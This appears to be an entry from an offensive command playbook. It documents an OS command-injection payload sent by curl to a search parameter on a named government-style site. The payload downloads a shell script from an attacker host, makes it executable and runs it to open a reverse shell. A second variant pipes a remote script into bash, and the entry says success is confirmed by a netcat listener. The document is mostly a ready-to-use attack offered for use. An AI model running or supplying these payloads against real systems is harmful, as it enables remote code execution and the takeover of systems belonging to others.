---
id: cmd-curl-rce-pay
data: >-
  curl "https://target-dod-site.gov/search?q=test; wget
  http://attacker-ip.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh;
  /tmp/shell.sh" -v
tags:
  - rce
  - payload
type: command
output: 'null'
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:07.914Z'
verified: false
validated: true
submitted: true
---
# curl-rce-payload

## Command

```bash
curl "https://target-dod-site.gov/search?q=test; wget http://attacker-ip.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh" -v
```

## Description

This command injects a multi-part payload to download, make executable, and run a reverse shell script from an attacker-controlled server, escalating the command injection to full RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `q=test; wget ...` | Injection payload chain for download and execution | Yes |
| `-v` | Verbose mode for debugging | No |

## Examples

### Basic Usage

```bash
curl "https://target-dod-site.gov/search?q=test; wget http://attacker-ip.com/shell.sh -O /tmp/shell.sh; chmod +x /tmp/shell.sh; /tmp/shell.sh" -v
```

### Advanced Usage

```bash
curl "https://target-dod-site.gov/search?q=test && curl -s http://attacker-ip.com/shell.sh \| bash" -v
```

## Expected Output

No direct output in response; success is confirmed by incoming connection to attacker's listener (e.g., netcat on port 4444), indicating shell execution on the target.

## Related

- [[Related Procedure|procedures/Exploit-OS-Command-Injection-for-RCE]]
